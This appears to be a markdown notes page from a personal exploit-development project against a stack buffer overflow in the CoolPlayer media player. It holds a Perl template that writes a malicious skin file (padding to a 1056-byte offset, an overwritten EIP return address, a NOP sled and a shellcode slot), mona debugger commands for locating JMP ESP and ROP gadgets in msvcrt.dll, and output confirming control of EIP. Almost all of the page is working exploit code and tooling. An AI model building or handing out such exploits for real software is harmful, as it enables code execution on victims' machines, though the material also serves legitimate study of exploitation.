# Exploit Dev

* see [Requirements](../Requirements.md)
* see [TODO](../TODO.md)
* see [Limiting Factors](../LimFact.md)
* see [Layout](../Layout.md)
* see [Resources](../Resources.md)
* see [How To](../How_To.md)

## Code

### Pattern Generation

*note: navigate to ```C:\cmd``` in cmd line*

```pattern_create 3000 > "C:\Documents and Settings\Administrator\Desktop\pattern.txt"```

### Perl

### template_shell.pl

```perl
my $file="shell.ini"; # file name
my $header="[CoolPlayer Skin]\nPlaylistSkin="; # file header
            # we know the offset is at 1056
my $pattern = "A" x 1056;
my $eip = pack('V',0x769ecf49); # eip
my $nopeslide = "\x90" x 16;
my $shellcode =         #shellcode


open($FILE,">$file");
print $FILE $header.$pattern.$eip.$nopeslide.$shellcode;
close($FILE);
```

### Mona

```!mona findmsp```
```!mona jmp -r esp```
```!mona rop -m msvcrt.dll -cp '\x00\x0a'```
```!mona find -type instr -s "retn" -m msvcrt.dll -cp '\x00\x0a' -x x```

#### Results

```text
[+] Looking for cyclic pattern in memory
    Cyclic pattern (normal) found at 0x001257d0 (length 212 bytes)
    Cyclic pattern (normal) found at 0x00137341 (length 2500 bytes)
    -  Stack pivot between 71501 & 74001 bytes needed to land in this pattern
    EIP contains normal pattern : 0x42326a42 (offset 1056)
    ESP (0x00125bf4) points at offset 1060 in normal pattern (length 1440)
    EBP contains normal pattern : 0x316a4230 (offset 1052)
    ESI (0x00125bfc) points at offset 1068 in normal pattern (length 1432)
```

### CoolPlayer Skin Format

```text
[CoolPlayer Skin]

PlaylistSkin=
```
